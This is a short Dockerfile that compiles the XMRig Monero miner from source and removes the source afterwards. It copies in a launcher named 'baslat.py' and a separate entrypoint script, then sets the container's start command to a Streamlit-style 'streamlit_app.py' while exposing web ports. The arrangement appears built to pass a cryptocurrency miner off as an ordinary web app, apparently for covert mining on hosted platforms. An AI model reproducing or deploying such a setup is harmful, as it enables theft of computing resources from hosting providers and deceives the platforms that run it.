FROM  alpine:3

RUN apk add --no-cache git make cmake libstdc++ gcc g++ libuv-dev openssl-dev hwloc-dev

RUN git clone https://github.com/xmrig/xmrig

RUN mkdir xmrig/build && cd xmrig/build && \
    cmake .. && \
    make -j$(nproc) && \
    chmod +x xmrig && \
    rm -r /xmrig/src
    

EXPOSE 7075
EXPOSE 80
EXPOSE 443

WORKDIR /xmrig/build

COPY docker-entrypoint.sh /usr/local/bin/
COPY baslat.py /xmrig/build/baslat.py
RUN chmod +x /usr/local/bin/docker-entrypoint.sh
RUN chmod +x /xmrig/build/baslat.py

ENV PYTHONUNBUFFERED=1
RUN apk add --update --no-cache python3 && ln -sf python3 /usr/bin/python
RUN python3 -m ensurepip
RUN pip3 install --no-cache --upgrade pip setuptools

CMD [ "python", "./streamlit_app.py"]

